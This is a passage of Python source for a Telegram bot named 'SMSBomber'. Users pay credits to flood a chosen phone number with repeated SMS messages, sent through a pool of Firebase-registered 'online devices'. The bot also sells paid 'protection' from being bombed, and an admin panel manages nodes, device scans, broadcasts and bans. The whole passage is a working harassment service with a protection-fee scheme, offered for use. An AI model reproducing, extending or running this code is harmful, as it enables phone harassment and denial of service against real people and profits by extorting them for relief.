        await state.clear(); return
    await state.update_data(number=number)
    await state.set_state(Form.bomb_message)
    await msg.answer(
        f"{PE.msg()} <b>{sc('Enter message')}</b>\n{SEP}\n"
        f"{sc('Type the SMS text to send.')}\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.bomb_message)
async def bomb_get_message(msg: types.Message, state: FSMContext):
    if not msg.text: return
    await state.update_data(message=msg.text.strip())
    await state.set_state(Form.bomb_count)
    d = load()
    u = get_user(d, msg.from_user.id)
    await msg.answer(
        f"{PE.numbers()} <b>{sc('Enter count')}</b>\n{SEP}\n"
        f"{PE.credit_card()} {sc('Your credits')}: <b>{u.get('credits', 0)}</b>\n"
        f"{PE.info()} 1 SMS = {CREDIT_PER_SMS} credit\n"
        f"{sc('You can request up to')} <b>{u.get('credits', 0)}</b> {sc('SMS')}\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.bomb_count)
async def bomb_get_count(msg: types.Message, state: FSMContext):
    # No max-count cap — only credits limit
    try:
        count = int(msg.text.strip())
        if count < 1:
            await msg.answer(f"{PE.cross()} {sc('Enter a number of at least 1.')}",
                             parse_mode="HTML"); return
    except Exception:
        await msg.answer(f"{PE.cross()} {sc('Enter a valid number.')}", parse_mode="HTML"); return

    d = load()
    uid = msg.from_user.id
    u = get_user(d, uid)
    cost = count * CREDIT_PER_SMS
    if u.get("credits", 0) < cost:
        await msg.answer(
            f"{PE.cross()} <b>{sc('Insufficient Credits')}</b>\n{SEP}\n"
            f"{PE.money()} {sc('Required')}: <b>{cost}</b>\n"
            f"{PE.credit_card()} {sc('You have')}: <b>{u.get('credits', 0)}</b>\n{SEP}",
            reply_markup=kb_main(is_admin(uid, d)), parse_mode="HTML")
        await state.clear(); return

    data = await state.get_data()
    await state.update_data(count=count)
    await state.set_state(Form.bomb_confirm)
    await msg.answer(
        f"📋 <b>{sc('Confirm Bombing')}</b>\n{SEP}\n"
        f"{PE.phone()} {sc('Number')}: <code>{data.get('number')}</code>\n"
        f"{PE.msg()} {sc('Message')}: <code>{data.get('message','')[:40]}</code>\n"
        f"{PE.numbers()} {sc('Count')}: <b>{count}</b>\n"
        f"{PE.credit_card()} {sc('Cost')}: <b>{cost} credits</b>\n{SEP}\n"
        f"{sc('Tap Confirm to launch.')}",
        reply_markup=kb_confirm(), parse_mode="HTML")

@R.message(Form.bomb_confirm, F.text == "✅ Confirm")
async def bomb_do_confirm(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    uid = msg.from_user.id
    number  = data.get("number")
    message = data.get("message", "Hello")
    count   = data.get("count")
    if not number or not count:
        await msg.answer(f"{PE.cross()} {sc('Session expired. Please try again.')}",
                         reply_markup=kb_main(is_admin(uid, load())), parse_mode="HTML"); return

    d = load()
    u = get_user(d, uid)
    cost = count * CREDIT_PER_SMS
    if u.get("credits", 0) < cost:
        await msg.answer(f"{PE.cross()} {sc('Insufficient credits.')}",
                         reply_markup=kb_main(is_admin(uid, d)), parse_mode="HTML"); return

    u["credits"] -= cost
    save(d)

    await msg.answer(
        f"{PE.rocket()} <b>{sc('Launching bomb...')}</b>\n{SEP}\n"
        f"{PE.credit_card()} {sc('Credits reserved')}: <b>{cost}</b>\n"
        f"{sc('Unused credits will be refunded automatically.')}\n{SEP}",
        reply_markup=kb_main(is_admin(uid, d)), parse_mode="HTML")
    await start_bombing(msg.bot, uid, number, message, count)

@R.message(Form.bomb_confirm, F.text == "❌ Cancel")
async def bomb_do_cancel(msg: types.Message, state: FSMContext):
    await state.clear()
    await msg.answer(f"{PE.check()} {sc('Cancelled.')}",
                     reply_markup=kb_main(is_admin(msg.from_user.id, load())), parse_mode="HTML")

# ── Protection flow ───────────────────────────────────────────
@R.message(F.text == "🛡️ Protect Number")
async def handle_protect(msg: types.Message, state: FSMContext):
    await state.clear()
    text = (
        f"{PE.shield()} <b>{sc('Protect Number')}</b>\n{SEP}\n"
        f"{sc('Protect your number from being bombed.')}\n{SEP}\n"
        f"{PE.money()} {sc('Price')}: <b>{PROTECTION_PRICE} Rs</b>\n"
        f"{PE.credit_card()} {sc('UPI')}: <code>{PAYMENT_UPI}</code>\n{SEP}\n"
        f"{sc('Steps')}:\n"
        f"1. {sc('Tap Pay and scan the QR')}\n"
        f"2. {sc('Send the amount to the UPI ID')}\n"
        f"3. {sc('Tap I have paid and enter the transaction ID')}\n"
        f"4. {sc('Provide your number — admin will approve shortly')}\n{SEP}"
    )
    await msg.answer(text, reply_markup=kb_pay(), parse_mode="HTML")

@R.message(F.text == "💳 Pay")
async def handle_pay(msg: types.Message, state: FSMContext):
    await state.clear()
    upi_str = f"upi://pay?pa={PAYMENT_UPI}&pn=SMSBomber&am={PROTECTION_PRICE}&cu=INR"
    qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=400x400&data={quote(upi_str)}"
    caption = (
        f"{PE.credit_card()} <b>{sc('Payment')}</b>\n{SEP}\n"
        f"{PE.money()} {sc('Amount')}: <b>{PROTECTION_PRICE} Rs</b>\n"
        f"{PE.credit_card()} {sc('UPI')}: <code>{PAYMENT_UPI}</code>\n{SEP}\n"
        f"{sc('Scan the QR and complete payment.')}\n{SEP}"
    )
    try:
        await msg.answer_photo(qr_url, caption=caption, parse_mode="HTML")
    except Exception as e:
        log.error(f"QR error: {e}")
        await msg.answer(caption + f"\n\nUPI: <code>{PAYMENT_UPI}</code>", parse_mode="HTML")
    await msg.answer(f"{sc('After payment, tap')} {PE.check()} <b>{sc('I have paid')}</b>",
                     reply_markup=kb_paid())

@R.message(F.text == "◀️ Back")
async def handle_pay_back(msg: types.Message, state: FSMContext):
    await state.clear()
    await msg.answer(f"{PE.check()} {sc('Returned to menu.')}",
                     reply_markup=kb_main(is_admin(msg.from_user.id, load())), parse_mode="HTML")

@R.message(F.text == "✅ I have paid")
async def handle_paid(msg: types.Message, state: FSMContext):
    await state.set_state(Form.protect_txn)
    await msg.answer(
        f"🧾 <b>{sc('Enter Transaction ID')}</b>\n{SEP}\n"
        f"{sc('Example')}: <code>T123456789012</code>\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.protect_txn)
async def protect_get_txn(msg: types.Message, state: FSMContext):
    if not msg.text: return
    txn = msg.text.strip()
    if len(txn) < 5:
        await msg.answer(f"{PE.cross()} {sc('Transaction ID too short.')}", parse_mode="HTML"); return
    await state.update_data(txn_id=txn)
    await state.set_state(Form.protect_number)
    await msg.answer(
        f"{PE.phone()} <b>{sc('Enter Number')}</b>\n{SEP}\n"
        f"{sc('Enter the number you want to protect.')}\n"
        f"<code>+919876543210</code>\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.protect_number)
async def protect_get_number(msg: types.Message, state: FSMContext):
    if not msg.text: return
    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer(f"{PE.cross()} {sc('Invalid number. Example: +919876543210')}",
                         parse_mode="HTML"); return

    data = await state.get_data()
    txn = data.get("txn_id")
    uid = msg.from_user.id
    username = msg.from_user.username or msg.from_user.first_name

    d = load()
    req_id = str(int(time.time() * 1000))
    req = {"id": req_id, "user_id": uid, "username": username,
           "number": number, "txn_id": txn,
           "status": "pending", "time": datetime.now().isoformat()}
    d["protection_requests"].append(req)
    save(d)
    await state.clear()

    await msg.answer(
        f"{PE.check()} <b>{sc('Request Submitted')}</b>\n{SEP}\n"
        f"{PE.user()} <code>{uid}</code>\n"
        f"{PE.phone()} <code>{number}</code>\n"
        f"{PE.credit_card()} {sc('Txn')}: <code>{txn}</code>\n{SEP}\n"
        f"{sc('Admin will review and approve soon.')}\n{SEP}",
        reply_markup=kb_main(is_admin(uid, d)), parse_mode="HTML")

    admin_text = (
        f"{PE.shield()} <b>{sc('New Protection Request')}</b>\n{SEP}\n"
        f"{PE.user()} {sc('User')}: <code>{uid}</code> (@{username})\n"
        f"{PE.phone()} {sc('Number')}: <code>{number}</code>\n"
        f"{PE.credit_card()} {sc('Txn')}: <code>{txn}</code>\n{SEP}"
    )
    kb_approve = kbi([[
        ("✅ Approve", f"admin:prot_approve:{req_id}", "success", "check"),
        ("❌ Reject",  f"admin:prot_reject:{req_id}",  "danger",  "cross"),
    ]])
    for admin_id in set(d.get("admins", []) + [OWNER_ID]):
        try: await msg.bot.send_message(admin_id, admin_text, reply_markup=kb_approve, parse_mode="HTML")
        except Exception as e: log.warning(f"notify admin {admin_id} failed: {e}")

# ════════════════════════════════════════════════════════════════
# ADMIN PANEL (styled inline)
# ════════════════════════════════════════════════════════════════
@R.message(F.text == "🛠️ Admin Panel")
async def handle_admin_panel(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    if not is_admin(uid, d):
        await msg.answer(f"{PE.ban()} {sc('Access denied.')}", parse_mode="HTML"); return

    stats = d.get("stats", {})
    pending = len([r for r in d.get("protection_requests", []) if r.get("status") == "pending"])
    text = (
        f"{PE.crown()} <b>{sc('Admin Panel')}</b>\n{SEP}\n"
        f"{PE.bomb()} {sc('Firebases')}: <b>{len(d.get('firebases', []))}</b>\n"
        f"{PE.check()} {sc('Total Sent')}: <b>{stats.get('total_sent', 0)}</b>\n"
        f"{PE.people()} {sc('Users')}: <b>{len(d.get('users', {}))}</b>\n"
        f"{PE.shield()} {sc('Pending protections')}: <b>{pending}</b>\n{SEP}\n"
        f"{sc('Choose an action below.')}\n{SEP}"
    )
    await msg.answer(text, reply_markup=admin_panel_inline(d), parse_mode="HTML")

# ── admin:panel (refresh) ─────────────────────────────────────
@R.callback_query(F.data == "admin:panel")
async def cb_admin_panel(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    stats = d.get("stats", {})
    pending = len([r for r in d.get("protection_requests", []) if r.get("status") == "pending"])
    text = (
        f"{PE.crown()} <b>{sc('Admin Panel')}</b>\n{SEP}\n"
        f"{PE.bomb()} {sc('Firebases')}: <b>{len(d.get('firebases', []))}</b>\n"
        f"{PE.check()} {sc('Total Sent')}: <b>{stats.get('total_sent', 0)}</b>\n"
        f"{PE.people()} {sc('Users')}: <b>{len(d.get('users', {}))}</b>\n"
        f"{PE.shield()} {sc('Pending protections')}: <b>{pending}</b>\n{SEP}\n"
        f"{sc('Choose an action below.')}\n{SEP}"
    )
    try:
        await cq.message.edit_text(text, reply_markup=admin_panel_inline(d), parse_mode="HTML")
    except Exception: pass
    await cq.answer()

# ── admin:stats ───────────────────────────────────────────────
@R.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    stats = d.get("stats", {})
    total = stats.get("total_sent", 0) + stats.get("total_failed", 0)
    rate = round(stats.get("total_sent", 0) / total * 100, 1) if total else 0
    text = (
        f"{PE.stats()} <b>{sc('Bot Statistics')}</b>\n{SEP}\n"
        f"{PE.people()} {sc('Users')}: <b>{len(d.get('users', {}))}</b>\n"
        f"{PE.bomb()} {sc('Firebases')}: <b>{len(d.get('firebases', []))}</b>\n"
        f"{PE.user()} {sc('Admins')}: <b>{len(d.get('admins', []))}</b>\n"
        f"{PE.ban()} {sc('Banned')}: <b>{len(d.get('banned', []))}</b>\n"
        f"{PE.shield()} {sc('Protected')}: <b>{len(d.get('protected_numbers', []))}</b>\n{SEP}\n"
        f"{PE.check()} {sc('Sent')}: <b>{stats.get('total_sent', 0)}</b>\n"
        f"{PE.cross()} {sc('Failed')}: <b>{stats.get('total_failed', 0)}</b>\n"
        f"{PE.bomb()} {sc('Total Bombings')}: <b>{stats.get('total_bombings', 0)}</b>\n"
        f"{PE.chart_up()} {sc('Success rate')}: <b>{rate}%</b>\n{SEP}"
    )
    try:
        await cq.message.edit_text(text, reply_markup=back_admin_inline(), parse_mode="HTML")
    except Exception: pass
    await cq.answer()

# ── admin:status ──────────────────────────────────────────────
@R.callback_query(F.data == "admin:status")
async def cb_admin_status(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    await cq.answer(sc("Scanning devices..."))
    try:
        await cq.message.edit_text(f"{PE.rocket()} {sc('Scanning devices...')}", parse_mode="HTML")
    except Exception: pass
    await animate_radar(cq.message, sc("Scanning devices..."), 2)
    fbs = d.get("firebases", [])
    devices = await discover_all_devices(fbs)
    text = (
        f"{PE.chart_up()} <b>{sc('Live Status')}</b>\n{SEP}\n"
        f"{PE.people()} {sc('Total devices')}: <b>{len(devices)}</b>\n{SEP}"
    )
    for i, fb in enumerate(fbs, 1):
        cnt = len([x for x in devices if x["fb_id"] == fb["id"]])
        text += f"\n{PE.bomb()} {sc('Node')} #{i}: <b>{cnt}</b> {sc('online')}"
    text += f"\n{SEP}"
    try:
        await cq.message.edit_text(text, reply_markup=back_admin_inline(), parse_mode="HTML")
    except Exception: pass

# ── admin:broadcast ───────────────────────────────────────────
@R.callback_query(F.data == "admin:broadcast")
async def cb_admin_broadcast(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    await state.set_state(Form.broadcast_msg)
    await cq.answer()
    try:
        await cq.message.edit_reply_markup(reply_markup=None)
    except Exception: pass
    await cq.message.answer(
        f"{PE.broadcast()} <b>{sc('Broadcast')}</b>\n{SEP}\n"
        f"{sc('Send the message you want to broadcast to all users.')}\n"
        f"{sc('HTML is supported.')}\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.broadcast_msg)
async def broadcast_send(msg: types.Message, state: FSMContext):
    uid = msg.from_user.id
    d = load()
    if not is_admin(uid, d): return
    if not msg.text:
        await msg.answer(f"{PE.cross()} {sc('Send a text message.')}", parse_mode="HTML"); return

    text = msg.text
    await state.clear()
    status = await msg.answer(
        f"{PE.broadcast()} <b>{sc('Broadcasting...')}</b>\n{SEP}\n{sc('Starting...')}\n{SEP}",
        parse_mode="HTML")
    users = list(d.get("users", {}).keys())
    sent = failed = 0
    for i, u_id in enumerate(users, 1):
        try:
            await msg.bot.send_message(int(u_id), text, parse_mode="HTML")
            sent += 1
        except Exception:
            failed += 1
        if i % 20 == 0:
            try:
                await status.edit_text(
                    f"{PE.broadcast()} <b>{sc('Broadcasting...')}</b>\n{SEP}\n"
                    f"{PE.check()} {sc('Sent')}: <b>{sent}</b>\n"
                    f"{PE.cross()} {sc('Failed')}: <b>{failed}</b>\n"
                    f"{PE.stats()} {i}/{len(users)}\n{SEP}",
                    parse_mode="HTML")
            except Exception: pass
        await asyncio.sleep(0.05)

    try:
        await status.edit_text(
            f"{PE.check()} <b>{sc('Broadcast Complete')}</b>\n{SEP}\n"
            f"{PE.check()} {sc('Sent')}: <b>{sent}</b>\n"
            f"{PE.cross()} {sc('Failed')}: <b>{failed}</b>\n{SEP}",
            parse_mode="HTML")
    except Exception: pass
    await msg.answer(sc("Admin panel:"), reply_markup=kb_main(True))

# ── admin:protection ──────────────────────────────────────────
@R.callback_query(F.data == "admin:protection")
async def cb_admin_protection(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    pend = [r for r in d.get("protection_requests", []) if r.get("status") == "pending"]
    if not pend:
        await cq.answer(sc("No pending requests."), show_alert=True); return
    text = f"{PE.shield()} <b>{sc('Pending Protections')}</b>\n{SEP}"
    for r in pend:
        text += (f"\n{PE.user()} <code>{r['user_id']}</code> | "
                 f"{PE.phone()} <code>{r['number']}</code>\n"
                 f"{PE.credit_card()} Txn: <code>{r['txn_id']}</code>\n")
    text += f"\n{SEP}"
    try:
        await cq.message.edit_text(text, reply_markup=protections_inline(pend), parse_mode="HTML")
    except Exception: pass
    await cq.answer()

@R.callback_query(F.data.startswith("admin:prot_approve:"))
async def cb_prot_approve(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()
    req = next((r for r in d["protection_requests"] if r["id"] == req_id), None)
    if not req:
        await cq.answer(sc("Request not found."), show_alert=True); return
    req["status"] = "approved"
    if req["number"] not in d["protected_numbers"]:
        d["protected_numbers"].append(req["number"])
    save(d)
    await cq.answer(sc("Approved!"), show_alert=True)
    try:
        await cq.bot.send_message(
            req["user_id"],
            f"{PE.shield()} <b>{sc('Protection Approved')}</b>\n{SEP}\n"
            f"{PE.check()} <code>{req['number']}</code> {sc('is now protected.')}\n{SEP}",
            parse_mode="HTML")
    except Exception: pass
    try: await cq.message.edit_reply_markup(reply_markup=None)
    except Exception: pass

@R.callback_query(F.data.startswith("admin:prot_reject:"))
async def cb_prot_reject(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()
    req = next((r for r in d["protection_requests"] if r["id"] == req_id), None)
    if not req:
        await cq.answer(sc("Request not found."), show_alert=True); return
    req["status"] = "rejected"
    save(d)
    await cq.answer(sc("Rejected."), show_alert=True)
    try:
        await cq.bot.send_message(
            req["user_id"],
            f"{PE.shield()} <b>{sc('Protection Rejected')}</b>\n{SEP}\n"
            f"{PE.cross()} {sc('Your request for')} <code>{req['number']}</code> {sc('was rejected.')}\n{SEP}",
            parse_mode="HTML")
    except Exception: pass
    try: await cq.message.edit_reply_markup(reply_markup=None)
    except Exception: pass

# ── admin:fb (Firebase Mgmt) ──────────────────────────────────
@R.callback_query(F.data == "admin:fb")
async def cb_admin_fb(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    fbs = d.get("firebases", [])
    text = f"{PE.bomb()} <b>{sc('Firebase Management')}</b>\n{SEP}\n"
    if not fbs:
        text += f"{sc('No firebases configured.')}\n"
    else:
        for i, fb in enumerate(fbs, 1):
            text += f"\n{i}. <code>{fb['url']}</code> {PE.check() if fb.get('api_key') else PE.cross()}"
    text += f"\n{SEP}"
    try:
        await cq.message.edit_text(text, reply_markup=fb_list_inline(fbs), parse_mode="HTML")
    except Exception: pass
    await cq.answer()

@R.callback_query(F.data == "admin:fb_add")
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    await state.set_state(Form.fb_add_url)
    await cq.answer()
    try: await cq.message.edit_reply_markup(reply_markup=None)
    except Exception: pass
    await cq.message.answer(
        f"{PE.link()} <b>{sc('Add Firebase')}</b>\n{SEP}\n"
        f"{sc('Send the Firebase database URL:')}\n"
        f"<code>https://your-project.firebaseio.com</code>\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.fb_add_url)
async def fb_add_url(msg: types.Message, state: FSMContext):
    url = (msg.text or "").strip()
    if not url.startswith("https://"):
        await msg.answer(f"{PE.cross()} {sc('URL must start with https://')}", parse_mode="HTML"); return
    await state.update_data(fb_url=url.rstrip("/"))
    await state.set_state(Form.fb_add_api)
    await msg.answer(
        f"🔑 <b>{sc('API Key')}</b>\n{SEP}\n"
        f"{sc('Send API key or type')} <code>skip</code>\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.fb_add_api)
async def fb_add_api(msg: types.Message, state: FSMContext):
    api = (msg.text or "").strip()
    if api.lower() == "skip": api = ""
    data = await state.get_data()
    d = load()
    new_fb = {"id": str(int(time.time())), "url": data.get("fb_url"), "api_key": api}
    d["firebases"].append(new_fb); save(d)
    await state.clear()
    status = await msg.answer(f"{PE.rocket()} {sc('Checking online devices...')}", parse_mode="HTML")
    await animate_radar(status, sc("Scanning..."), 2)
    try: devs = await discover_online_devices(new_fb)
    except Exception as e:
        log.error(f"fb check error: {e}"); devs = []
    if not devs:
        d = load()
        d["firebases"] = [x for x in d["firebases"] if x["id"] != new_fb["id"]]
        save(d)
        await msg.answer(
            f"{PE.cross()} <b>{sc('Firebase Removed')}</b>\n{SEP}\n"
            f"{sc('No online devices found.')}\n{SEP}",
            reply_markup=kb_main(True), parse_mode="HTML")
    else:
        await msg.answer(
            f"{PE.check()} <b>{sc('Firebase Added')}</b>\n{SEP}\n"
            f"{PE.people()} {sc('Online devices')}: <b>{len(devs)}</b>\n{SEP}",
            reply_markup=kb_main(True), parse_mode="HTML")
    await msg.answer(sc("Admin panel:"), reply_markup=kb_main(True))

@R.callback_query(F.data.startswith("admin:fb_del:"))
async def cb_fb_del(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    fb_id = cq.data.split(":")[2]
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    await cq.answer(sc("Firebase removed."), show_alert=True)
    try:
        fbs = d.get("firebases", [])
        text = f"{PE.bomb()} <b>{sc('Firebase Management')}</b>\n{SEP}\n"
        if not fbs: text += f"{sc('No firebases configured.')}\n"
        else:
            for i, fb in enumerate(fbs, 1):
                text += f"\n{i}. <code>{fb['url']}</code> {PE.check() if fb.get('api_key') else PE.cross()}"
        text += f"\n{SEP}"
        await cq.message.edit_text(text, reply_markup=fb_list_inline(fbs), parse_mode="HTML")
    except Exception: pass

# ── admin:schedules ───────────────────────────────────────────
@R.callback_query(F.data == "admin:schedules")
async def cb_admin_schedules(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    s = d.get("schedules", [])
    text = f"{PE.timer()} <b>{sc('Schedules')}</b>\n{SEP}\n"
    if not s: text += f"{sc('No schedules.')}\n"
    for x in s:
        text += (f"\n{PE.phone()} <code>{x['number']}</code> × {x['count']}\n"
                 f"🕒 {x['time']}\n{x['status']}\n")
    text += f"\n{SEP}"
    try:
        await cq.message.edit_text(text, reply_markup=back_admin_inline(), parse_mode="HTML")
    except Exception: pass
    await cq.answer()

# ── admin:admins ──────────────────────────────────────────────
@R.callback_query(F.data == "admin:admins")
async def cb_admin_admins(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    admins = d.get("admins", [OWNER_ID])
    text = f"{PE.people()} <b>{sc('Admins')}</b>\n{SEP}\n"
    for a in admins:
        text += f"• <code>{a}</code>" + (" (owner)" if a == OWNER_ID else "") + "\n"
    text += f"\n{SEP}\n{sc('Send /addadmin <id> to add, /deladmin <id> to remove')}\n{SEP}"
    try:
        await cq.message.edit_text(text, reply_markup=admins_inline(d), parse_mode="HTML")
    except Exception: pass
    await cq.answer()

@R.callback_query(F.data == "admin:admin_add")
async def cb_admin_add(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    await state.set_state(Form.admin_add_id)
    await cq.answer()
    try: await cq.message.edit_reply_markup(reply_markup=None)
    except Exception: pass
    await cq.message.answer(
        f"➕ <b>{sc('Add Admin')}</b>\n{SEP}\n"
        f"{sc('Send the user ID to add as admin.')}\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.admin_add_id)
async def process_admin_add(msg: types.Message, state: FSMContext):
    try:
        aid = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{PE.cross()} {sc('Invalid ID.')}", parse_mode="HTML"); return
    d = load()
    if aid not in d["admins"]:
        d["admins"].append(aid); save(d)
        await state.clear()
        await msg.answer(f"{PE.check()} {sc('Admin added')}: <code>{aid}</code>",
                         reply_markup=kb_main(True), parse_mode="HTML")
    else:
        await msg.answer(f"{PE.info()} {sc('Already admin.')}",
                         reply_markup=kb_main(True), parse_mode="HTML")
        await state.clear()

@R.callback_query(F.data.startswith("admin:admin_del:"))
async def cb_admin_del(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    try: did = int(cq.data.split(":")[2])
    except Exception:
        await cq.answer(sc("Invalid"), show_alert=True); return
    if did == OWNER_ID:
        await cq.answer(sc("Cannot remove owner."), show_alert=True); return
    if did in d["admins"]:
        d["admins"].remove(did); save(d)
        await cq.answer(sc("Admin removed."), show_alert=True)
    # Refresh
    try:
        admins = d.get("admins", [OWNER_ID])
        text = f"{PE.people()} <b>{sc('Admins')}</b>\n{SEP}\n"
        for a in admins:
            text += f"• <code>{a}</code>" + (" (owner)" if a == OWNER_ID else "") + "\n"
        text += f"\n{SEP}"
        await cq.message.edit_text(text, reply_markup=admins_inline(d), parse_mode="HTML")
    except Exception: pass

# ── admin:ban ─────────────────────────────────────────────────
@R.callback_query(F.data == "admin:ban")
async def cb_admin_ban(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    banned = d.get("banned", [])
    text = (f"{PE.ban()} <b>{sc('Ban / Unban')}</b>\n{SEP}\n"
            f"{sc('Banned users')}: <b>{len(banned)}</b>\n{SEP}\n"
            f"{sc('Use')} <code>/ban &lt;id&gt;</code> {sc('to ban')}\n"
            f"{sc('Tap a button below to unban')}\n{SEP}")
    try:
        await cq.message.edit_text(text, reply_markup=unban_inline(banned), parse_mode="HTML")
    except Exception: pass
    await cq.answer()

@R.callback_query(F.data.startswith("admin:unban_do:"))
async def cb_unban_do(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    try: bid = int(cq.data.split(":")[2])
    except Exception:
        await cq.answer(sc("Invalid"), show_alert=True); return
    if bid in d["banned"]:
        d["banned"].remove(bid); save(d)
        await cq.answer(sc(f"Unbanned {bid}"), show_alert=True)
    try:
        banned = d.get("banned", [])
        text = (f"{PE.ban()} <b>{sc('Ban / Unban')}</b>\n{SEP}\n"
                f"{sc('Banned users')}: <b>{len(banned)}</b>\n{SEP}")
        await cq.message.edit_text(text, reply_markup=unban_inline(banned), parse_mode="HTML")
    except Exception: pass

@R.message(Command("ban"))
async def cmd_ban(msg: types.Message):
    uid = msg.from_user.id
    d = load()
    if not is_admin(uid, d): return
    parts = msg.text.split()
    if len(parts) < 2:
        await msg.answer(f"{sc('Usage: /ban <id>')}", parse_mode="HTML"); return
    try: bid = int(parts[1])
    except Exception:
        await msg.answer(f"{PE.cross()} {sc('Invalid ID')}", parse_mode="HTML"); return
    if bid not in d["banned"]:
        d["banned"].append(bid); save(d)
        await msg.answer(f"{PE.ban()} {sc('Banned')} <code>{bid}</code>", parse_mode="HTML")

@R.message(Command("unban"))
async def cmd_unban(msg: types.Message):
    uid = msg.from_user.id
    d = load()
    if not is_admin(uid, d): return
    parts = msg.text.split()
    if len(parts) < 2:
        await msg.answer(f"{sc('Usage: /unban <id>')}", parse_mode="HTML"); return
    try: bid = int(parts[1])
    except Exception:
        await msg.answer(f"{PE.cross()} {sc('Invalid ID')}", parse_mode="HTML"); return
    if bid in d["banned"]:
        d["banned"].remove(bid); save(d)
        await msg.answer(f"{PE.check()} {sc('Unbanned')} <code>{bid}</code>", parse_mode="HTML")

# ── admin:db_backup / db_restore ──────────────────────────────
@R.callback_query(F.data == "admin:db_backup")
async def cb_db_backup(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    if not os.path.exists(DATA_FILE):
        await cq.answer(sc("DB file missing."), show_alert=True); return
    await cq.answer(sc("Preparing backup..."))
    try:
        await cq.bot.send_document(
            cq.from_user.id,
            document=FSInputFile(DATA_FILE),
            caption=sc("💾 Database backup"))
    except Exception as e:
        await cq.answer(sc(f"Error: {e}"), show_alert=True)

@R.callback_query(F.data == "admin:db_restore")
async def cb_db_restore(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("Access denied"), show_alert=True); return
    await state.set_state(Form.db_restore)
    await cq.answer()
    try: await cq.message.edit_reply_markup(reply_markup=None)
    except Exception: pass
    await cq.message.answer(
        f"{PE.download()} <b>{sc('Restore Database')}</b>\n{SEP}\n"
        f"{PE.warning()} {sc('Send the backup JSON file now.')}\n"
        f"{sc('This will overwrite all current data!')}\n{SEP}",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.db_restore, F.document)
async def process_db_restore(msg: types.Message, state: FSMContext):
    uid = msg.from_user.id
    d = load()
    if not is_admin(uid, d):
        return
    if not (msg.document.file_name or "").endswith(".json"):
        await msg.answer(f"{PE.cross()} {sc('Send a .json file.')}", parse_mode="HTML"); return

    path = f"restore_{msg.document.file_unique_id}.json"
    try:
        await msg.bot.download(msg.document.file_id, destination=path)
        with open(path) as f: new_data = json.load(f)
        if "admins" in new_data and "firebases" in new_data:
            save(new_data)
            await state.clear()
            await msg.answer(
                f"{PE.check()} <b>{sc('Database restored.')}</b>\n{SEP}\n"
                f"{PE.people()} {sc('Users')}: <b>{len(new_data.get('users', {}))}</b>\n"
                f"{PE.bomb()} {sc('Firebases')}: <b>{len(new_data.get('firebases', []))}</b>\n{SEP}",
                reply_markup=kb_main(True), parse_mode="HTML")
        else:
            await msg.answer(f"{PE.cross()} {sc('Invalid database file.')}", parse_mode="HTML")
    except Exception as e:
        await msg.answer(f"{PE.cross()} {sc(f'Restore failed: {e}')}", parse_mode="HTML")
    finally:
        try: os.remove(path)
        except Exception: pass

# ── home callback ─────────────────────────────────────────────
@R.callback_query(F.data == "home")
async def cb_home(cq: types.CallbackQuery, state: FSMContext = None):
    if state:
